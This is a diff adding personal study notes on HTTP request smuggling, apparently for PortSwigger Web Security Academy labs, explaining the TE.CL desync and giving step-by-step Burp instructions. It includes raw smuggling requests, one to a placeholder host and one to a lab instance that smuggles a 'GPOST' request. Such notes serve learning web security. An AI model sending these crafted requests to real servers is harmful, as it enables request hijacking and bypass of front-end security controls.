@@ -56,4 +56,38 @@ TIP:- Use HTTP Rquest Smuggler extension.
      5. Send the request and then send the normal request and lab is solved. but in normal request change HTTP method and GET to POST
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
+TE.CL VULNERABILITY--------
+ Here, the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can perform a simple HTTP request smuggling attack as follows:
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
 
+8
+SMUGGLED
+0
+
+--------------------------------------------------------------------------
+#3 Lab : HTTP request smuggling, basic TE.CL vulnerability
+
+     1. Downgrade HTTP protocol to HTTP 1.1 using inspector and change request method to POST
+     2. Disable automatic update of Content-Length
+     3. Show non- printable characters
+     4. Then send the / request to repeater
+     5. In the modified request, change the request body to the below and send the request
+
+         POST / HTTP/1.1
+         Host: 0a97007904accc54834e47b6000e0033.web-security-academy.net
+         Content-Type: application/x-www-form-urlencoded
+         Content-Length: 4
+         Transfer-Encoding: chunked
+
+         56
+         GPOST / HTTP/1.1
+         Content-Type: application/x-www-form-urlencoded
+         Content-Length: 6    (here keep it as 5 then send request and keep increasing it until in normal request u get Unrecognised method GPOST )
+
+         0
+
+
+---------------------------------------------------------------------------------------------------------------
